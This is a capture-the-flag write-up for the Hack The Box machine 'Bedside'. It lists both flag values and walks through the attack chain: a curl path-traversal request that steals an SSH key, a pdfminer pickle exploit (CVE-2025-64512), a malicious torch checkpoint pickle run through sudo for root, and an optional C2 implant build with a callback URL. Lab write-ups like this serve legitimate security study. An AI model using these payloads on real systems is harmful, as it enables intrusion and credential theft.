# HTB Bedside — Solved (user + root)

Authorized HTB lab only.

| Field | Value |
| --- | --- |
| Target IP | `10.129.248.191` |
| VPN (`tun0`) | `10.10.14.15` |
| Solved | 2026-08-16 |
| Hostnames | `bedside.htb`, `research.bedside.htb` |

## Flags

| Flag | Value | Path |
| --- | --- | --- |
| user.txt | `51ece35342843c5c8f72c4be6940d77c` | `/home/developer/user.txt` |
| root.txt | `dc63e7eb250e4a24cf54eff1cc0775ec` | `/root/root.txt` |

## Attack path (what actually worked)

```text
SSH as developer (static ed25519 key)
  → user.txt
  → sudo NOPASSWD: python3 /opt/trainer/bedside_trainer.py
  → need write on /datastore/checkpoints (770 datawrangler:dataops)
  → pdf_watcher.py (30s loop) + CVE-2025-64512 pickle
      chmod 755 /datastore; chmod 777 checkpoints/processed
  → torch.save({model: RCE}) → pwn.pt
  → sudo trainer → MONAI CheckpointLoader / torch.load as root
  → root.txt
```

Intended “from zero” chain is the same, except the developer key is normally stolen via localhost `:3000` path traversal after a container shell. On this instance the **host SSH key is static across resets**, so user is reachable without waiting on the watcher.

## Services

```text
22/tcp  open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4
80/tcp  open     http    Apache/2.4.68 → bedside.htb
3000/tcp filtered from VPN; listens on * as esm.sh on the host
```

`research.bedside.htb` is a PHP upload portal (`X-Powered-By: pdfminer.six`). Allowed types include undocumented `gz`/`zip`. Invalid non-gzip `.pickle.gz` leaks:

`MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads`

## Foothold details

### Developer SSH (this run)

Key lives at `/home/developer/.ssh/id_ed25519` (comment `developer@bedside`). It did **not** rotate on machine reset. Saved locally as `~/htb-bedside/dev_key` (mode 600; do not commit).

```bash
ssh -i ~/htb-bedside/dev_key developer@10.129.248.191
cat /home/developer/user.txt
# 51ece35342843c5c8f72c4be6940d77c
```

Legitimate in-box steal (from container or from host loopback):

```bash
curl -s --path-as-is 'http://127.0.0.1:3000/../../../../home/developer/.ssh/id_rsa'
# also: .../home/developer/user.txt
# process on :3000 is esm.sh (not Vite); --path-as-is is required
```

### PDF watcher + CVE-2025-64512

Uploads are **not** parsed in-request (POST returns in ~50ms). `/app/pdf_watcher.py` in the `data-wrangler` container:

- globs `/var/www/research.bedside.htb/uploads/*.pdf` every **30s**
- runs `pdf2txt.py` with **10s** timeout
- rejects names with `/`, `..`, leading `-`, and rejects symlinks

Exploit: upload real gzip pickle `shell.pickle.gz` + `trigger.pdf` whose Type0 `/Encoding` is `/` → `#2F` of

`/var/www/research.bedside.htb/uploads/shell`

(`pdfminer` appends `.pickle.gz`). Background the payload (`setsid … &`) or the 10s timeout kills it. Reverse-shell-only payloads that block `os.system` stall the worker for 10s **per PDF**.

This run used the watcher only to `chmod` `/datastore` so `developer` could write checkpoints.

## Root

```text
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Script loads the newest `/datastore/checkpoints/*.pt` via MONAI `CheckpointLoader` (`torch.load`). `developer` is not in `dataops`; `/datastore` starts `770`. After watcher chmod:

```text
drwxr-xr-x datawrangler dataops /datastore
drwxrwxrwx datawrangler dataops /datastore/checkpoints
drwxrwxrwx datawrangler dataops /datastore/processed
```

Need at least one valid image in `processed/` (1×1 PNG) **before** the checkpoint load, or the trainer exits.

```python
import os, torch
class RCE:
    def __reduce__(self):
        return (os.system, (
            "cat /root/root.txt > /tmp/rootflag; "
            "cp /root/root.txt /home/developer/rootflag.txt; "
            "chmod 644 /tmp/rootflag /home/developer/rootflag.txt",
        ))
torch.save({"model": RCE()}, "/datastore/checkpoints/pwn.pt")
```

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
# TypeError after pickle (expected); flag already written
# dc63e7eb250e4a24cf54eff1cc0775ec
```

Sudoers is the exact argv pair — extra flags may be rejected. Default 50-epoch loop never matters if `__reduce__` fires first.

## ARK notes / gaps

Linux web → host SSH → local sudo. No implant was required for flags.

| Gap | Workaround | Wanted |
| --- | --- | --- |
| Linux C implant not used | SSH as developer | Optional post-flag drop (`make implant-c-linux`) |
| No Linux C SOCKS | Host `:3000` is loopback-only from VPN; SSH `-L 3000:127.0.0.1:3000` or Ligolo | Linux C SOCKS (already noted Sprint L) |
| No pdfminer / pickle helper | External Python | Not a product goal |
| No host-side “sudo script + torch checkpoint” helper | Manual | Not a product goal |

C implant QA from the constrained `datawrangler` container is still a useful follow-up, not needed for these flags.

```bash
# optional, after teamserver up
make implant-c-linux CALLBACK_URL=https://10.10.14.15:8443 \
  CA_CERT_PATH=$HOME/.ark/ca-cert.pem SLEEP_MS=500
# scp/curl onto box as developer; ark op sessions
```

## Cleanup

- Removed `pwn.pt` and the copied flag files from the developer home.
- Left `/datastore` mode `755` / children `777` (reset on machine recycle).
- Do not commit `~/htb-bedside/dev_key` or `~/.ark/*.db`.

## Timeline

| When | What |
| --- | --- |
| 2026-08-05 / 08-09 | Upload + PDF worked; RCE missed because watcher is async 30s and early reverse shells hung the worker |
| 2026-08-16 | New IP `10.129.248.191`; static developer key → user; watcher chmod + torch checkpoint → root |
